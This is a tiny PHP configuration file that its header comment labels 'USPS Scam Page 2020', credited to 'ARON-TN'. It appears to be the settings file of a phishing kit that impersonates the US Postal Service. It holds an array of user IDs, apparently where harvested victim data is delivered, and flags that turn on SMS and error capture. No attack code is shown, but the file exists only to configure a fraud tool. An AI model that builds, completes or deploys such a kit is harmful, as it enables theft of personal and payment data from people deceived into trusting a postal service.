<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
$user_ids=array("1747804158");
$sms='1';
$error='1';
?>
